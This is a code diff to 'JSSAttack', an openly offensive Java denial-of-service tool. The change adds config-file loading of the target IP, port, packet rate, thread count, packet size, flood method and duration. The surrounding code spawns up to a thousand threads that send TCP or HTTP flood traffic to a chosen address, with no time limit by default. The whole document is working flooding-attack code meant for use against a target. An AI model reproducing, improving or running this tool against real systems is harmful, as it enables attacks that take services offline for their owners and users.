@@ -3,6 +3,7 @@ package ir.xenoncommunity.jss;
 import ir.xenoncommunity.jss.methods.IAttackMethod;
 import ir.xenoncommunity.jss.methods.impl.*;
 import ir.xenoncommunity.jss.utils.*;
+import ir.xenoncommunity.jss.utils.filemanager.Value;
 import lombok.Getter;
 import lombok.RequiredArgsConstructor;
 import lombok.SneakyThrows;
@@ -27,7 +28,7 @@ public class JSSAttack implements Runnable {
      * @return the appropriate attack method
      */
     @NotNull
-    private static IAttackMethod getMethod(String method, Integer byteSize, AttackStatics attackStatics) {
+    private IAttackMethod getMethod(final String method, final Integer byteSize, AttackStatics attackStatics) {
         return switch (method.toUpperCase()) {
             case "TCPFLOOD", "TCP", "TCP_FLOOD" -> new TCPFlood(attackStatics, byteSize);
             case "HTTPFLOOD", "HTTP", "HTTP_FLOOD" -> new HTTPFlood(attackStatics);
@@ -43,17 +44,80 @@ public class JSSAttack implements Runnable {
      */
     @SneakyThrows
     public void run() {
-        // Parse command line arguments
-        final boolean debug = this.parser.get("--debug", Boolean.class, false);
-        final String ip = this.parser.get("--ip", String.class, null);
-        final Integer port = this.parser.get("--port", Integer.class, -1);
-        final Integer ppsLimit = this.parser.get("--pps", Integer.class, -1);
-        final Integer maxThreads = this.parser.get("--threads", Integer.class, 1000);
-        final Integer byteSize = this.parser.get("--byteSize", Integer.class, 1500);
-        final Integer duration = this.parser.get("--duration", Integer.class, -1);
-        final String method = this.parser.get("--method", String.class, "TCPFLOOD");
-        final Boolean verbose = this.parser.get("--verbose", Boolean.class, false);
+        boolean debug = false;
+        String ip = null;
+        Integer port;
+        Integer ppsLimit = null;
+        Integer maxThreads = null;
+        Integer byteSize = null;
+        Integer duration;
+        String method = null;
+        Boolean verbose = null;
+        FileManager.values.add(new Value("ip", "0.0.0.0"));
+        FileManager.values.add(new Value("port", 1024));
+        FileManager.values.add(new Value("ppsLimit", 1000));
+        FileManager.values.add(new Value("maxThreads", 5));
+        FileManager.values.add(new Value("byteSize", 1024));
+        FileManager.values.add(new Value("method", "TCPFLOOD"));
+        FileManager.values.add(new Value("verbose", false));
+        FileManager.values.add(new Value("duration", -1));
+        if (this.parser.get("--config", String.class, null) != null){
+            duration = null;
+            port = null;
+            FileManager.init();
+            for(Value val : FileManager.values){
+                switch(val.getName()){
+                    case "ip":{
+                        ip = (String) val.getValue();
+                        break;
+                    }
+                    case "port":{
+                        port = Integer.parseInt((String) val.getValue());
+                        break;
+                    }
+                    case "ppsLimit":{
+                        ppsLimit = Integer.parseInt((String) val.getValue());
+                        break;
+                    }
+                    case "maxThreads":{
+                        maxThreads = Integer.parseInt((String) val.getValue());
+                        break;
+                    }
+                    case "byteSize":{
+                        byteSize = Integer.parseInt((String) val.getValue());
+                        break;
+                    }
+                    case "method":{
+                        method = (String) val.getValue();
+                        break;
+                    }
+                    case "verbose":{
+                        verbose = Boolean.parseBoolean((String) val.getValue());
+                        break;
+                    }
+                    case "duration":{
+                        duration = Integer.parseInt((String) val.getValue());
+                        break;
+                    }
 
+                }
+            }
+
+        } else {
+            //Clears the entire FileManager values because we don't need them.
+            FileManager.values.clear();
+            // Parse command line arguments
+            debug = this.parser.get("--debug", Boolean.class, false);
+            ip = this.parser.get("--ip", String.class, null);
+            port = this.parser.get("--port", Integer.class, -1);
+            ppsLimit = this.parser.get("--pps", Integer.class, -1);
+            maxThreads = this.parser.get("--threads", Integer.class, 1000);
+            byteSize = this.parser.get("--byteSize", Integer.class, 1500);
+            duration = this.parser.get("--duration", Integer.class, -1);
+            method = this.parser.get("--method", String.class, "TCPFLOOD");
+            verbose = this.parser.get("--verbose", Boolean.class, false);
+
+        }
         if (ip == null) {
             System.out.println("JSSAttack by XenonCommunity");
             System.out.println("Usage: java -jar JSSAttack.jar --ip <ip> --port <port> --threads <threads> --byteSize <byteSize> --duration <duration> --method <method> [--verbose] [--debug]");
@@ -83,8 +147,8 @@ public class JSSAttack implements Runnable {
         final AttackStatics attackStatics = new AttackStatics(ppsLimit);
         final IAttackMethod attackMethod = getMethod(method, byteSize, attackStatics);
         final InetAddress addr = InetAddress.getByName(ip);
-        final LocalTime endTime = LocalTime.now().plus(Duration.ofSeconds(duration));
-
+        Integer finalDuration = duration;
+        final LocalTime endTime = LocalTime.now().plus(Duration.ofSeconds(finalDuration));
         Logger.log(Logger.LEVEL.DEBUG, "addr: " + addr);
 
         // Start the attack and log thread creation
@@ -92,10 +156,11 @@ public class JSSAttack implements Runnable {
         for (int i = 1; i <= maxThreads; i++) {
             Logger.log(Logger.LEVEL.DEBUG, "Adding new thread." + i + " Max: " + maxThreads);
 
+            Integer finalPort = port;
             taskManager.add(() -> {
                 do {
                     try {
-                        attackMethod.send(addr, port == -1 ? Randomize.randomPort() : port);
+                        attackMethod.send(addr, finalPort == -1 ? Randomize.randomPort() : finalPort);
                     } catch (Exception ignored) {
 
                     }
@@ -107,8 +172,9 @@ public class JSSAttack implements Runnable {
         Logger.log(Logger.LEVEL.INFO, "Attacking...");
 
         // Add task to manage statics for each second
+
         taskManager.add(() -> {
-            while (LocalTime.now().isBefore(endTime) || duration == -1) {
+            while (LocalTime.now().isBefore(endTime) || finalDuration == -1) {
                 try {
                     TimeUnit.SECONDS.sleep(1);
                     attackStatics.second();
